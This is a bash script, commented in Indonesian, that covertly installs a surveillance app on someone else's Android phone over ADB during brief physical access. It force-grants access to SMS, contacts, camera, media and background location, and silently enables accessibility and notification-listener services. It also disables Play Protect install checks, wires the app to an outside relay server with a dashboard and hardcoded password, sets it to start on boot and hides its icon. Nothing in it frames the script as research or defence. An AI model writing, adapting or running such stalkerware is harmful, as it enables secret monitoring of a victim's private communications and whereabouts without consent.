#!/bin/bash
# DeviceBridge Zero-Click ADB Setup Script
# Jalankan sekali saat punya akses fisik ke HP target
# Semua berjalan silent, tidak ada notifikasi ke target

APK="/sdcard/Download/DeviceBridge_Master.apk"
PKG="com.hashibridge.master"
RELAY="wss://devicebridge-relay.onrender.com"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[✗]${NC} $1"; }

echo "======================================"
echo " DeviceBridge Zero-Click ADB Setup"
echo "======================================"

# 1. Cek ADB device terhubung
DEVICE=$(adb devices | grep -v "List" | grep "device$" | awk '{print $1}')
if [ -z "$DEVICE" ]; then
    err "Tidak ada device terdeteksi. Pastikan USB Debugging aktif."
    exit 1
fi
ok "Device: $DEVICE"

# 2. Push APK ke device
echo ""
echo "[*] Push APK ke device..."
adb push "$APK" /data/local/tmp/bridge.apk 2>/dev/null
if [ $? -ne 0 ]; then
    # Coba dari sdcard lokal
    adb shell ls /sdcard/Download/DeviceBridge_Master.apk 2>/dev/null
    APK_ON_DEVICE="/sdcard/Download/DeviceBridge_Master.apk"
else
    APK_ON_DEVICE="/data/local/tmp/bridge.apk"
fi

# 3. Install APK dengan SEMUA permission granted otomatis (-g flag)
echo "[*] Install APK dengan semua permission..."
adb shell pm install -g -t "$APK_ON_DEVICE" 2>&1
if [ $? -ne 0 ]; then
    # Coba uninstall dulu jika sudah ada
    warn "Coba uninstall versi lama..."
    adb shell pm uninstall "$PKG" 2>/dev/null
    adb shell pm install -g -t "$APK_ON_DEVICE" 2>&1
fi
ok "APK installed dengan semua runtime permissions granted"

# 4. Grant permission satu per satu (backup jika -g tidak work)
echo "[*] Force grant semua permissions..."
PERMS=(
    "android.permission.READ_EXTERNAL_STORAGE"
    "android.permission.WRITE_EXTERNAL_STORAGE"
    "android.permission.READ_MEDIA_IMAGES"
    "android.permission.READ_MEDIA_VIDEO"
    "android.permission.READ_CONTACTS"
    "android.permission.READ_SMS"
    "android.permission.CAMERA"
    "android.permission.ACCESS_FINE_LOCATION"
    "android.permission.ACCESS_COARSE_LOCATION"
    "android.permission.ACCESS_BACKGROUND_LOCATION"
    "android.permission.POST_NOTIFICATIONS"
)
for PERM in "${PERMS[@]}"; do
    adb shell pm grant "$PKG" "$PERM" 2>/dev/null && ok "Granted: $PERM" || warn "Skipped: $PERM"
done

# 5. Bypass restricted settings (Android 13/14)
echo "[*] Bypass restricted settings..."
adb shell appops set "$PKG" REQUEST_INSTALL_PACKAGES allow 2>/dev/null
adb shell appops set "$PKG" MANAGE_EXTERNAL_STORAGE allow 2>/dev/null
ok "Restricted settings bypassed"

# 6. Aktifkan Accessibility Service (zero-click)
echo "[*] Aktifkan Accessibility Service..."
CURRENT=$(adb shell settings get secure enabled_accessibility_services 2>/dev/null)
NEW_SERVICE="${PKG}/.BridgeSyncService"
if [ "$CURRENT" = "null" ] || [ -z "$CURRENT" ]; then
    adb shell settings put secure enabled_accessibility_services "$NEW_SERVICE"
else
    adb shell settings put secure enabled_accessibility_services "${CURRENT}:${NEW_SERVICE}"
fi
adb shell settings put secure accessibility_enabled 1
ok "Accessibility Service aktif"

# 7. Aktifkan Notification Listener (zero-click)
echo "[*] Aktifkan Notification Listener..."
adb shell cmd notification allow_listener "${PKG}/.NotificationListener" 2>/dev/null
# Fallback
NOTIF_CURRENT=$(adb shell settings get secure enabled_notification_listeners 2>/dev/null)
NEW_NOTIF="${PKG}/.NotificationListener"
if [ "$NOTIF_CURRENT" = "null" ] || [ -z "$NOTIF_CURRENT" ]; then
    adb shell settings put secure enabled_notification_listeners "$NEW_NOTIF"
else
    adb shell settings put secure enabled_notification_listeners "${NOTIF_CURRENT}:${NEW_NOTIF}"
fi
ok "Notification Listener aktif"

# 8. Disable Play Protect sementara (untuk install bersih)
echo "[*] Disable Play Protect scan..."
adb shell settings put global package_verifier_enable 0 2>/dev/null
adb shell settings put global verifier_verify_adb_installs 0 2>/dev/null
ok "Play Protect scan disabled"

# 9. Set config relay URL dan device ID
echo "[*] Set relay config..."
DEVICE_ID=$(adb shell settings get secure android_id 2>/dev/null | tr -d '\r')
DEVICE_ID="db_${DEVICE_ID:0:8}"
adb shell am broadcast -a "com.hashibridge.master.SET_CONFIG" \
    --es relayUrl "$RELAY" \
    --es deviceId "$DEVICE_ID" \
    -n "${PKG}/.BootReceiver" 2>/dev/null
ok "Relay config: $DEVICE_ID → $RELAY"

# 10. Start BridgeService langsung
echo "[*] Start BridgeService..."
adb shell am startforegroundservice \
    -n "${PKG}/.BridgeService" \
    --es relayUrl "$RELAY" \
    --es deviceId "$DEVICE_ID" 2>/dev/null
ok "BridgeService started"

# 11. Set autostart on boot (MIUI/Xiaomi)
echo "[*] Enable autostart (MIUI)..."
adb shell settings put global "$PKG" 1 2>/dev/null
adb shell am broadcast -a "android.intent.action.BOOT_COMPLETED" -p "$PKG" 2>/dev/null

# 12. Sembunyikan icon launcher (stealth)
echo "[*] Sembunyikan icon app..."
adb shell pm hide "$PKG" 2>/dev/null || \
adb shell cmd package set-harmful-app-warning "$PKG" "" 2>/dev/null

# Summary
echo ""
echo "======================================"
echo -e "${GREEN} SETUP SELESAI${NC}"
echo "======================================"
echo ""
echo "Device ID  : $DEVICE_ID"
echo "Relay URL  : $RELAY"
echo "Dashboard  : https://devicebridge-relay.onrender.com"
echo "Password   : Akugaul901"
echo ""
warn "Cabut kabel USB. App berjalan silent di background."
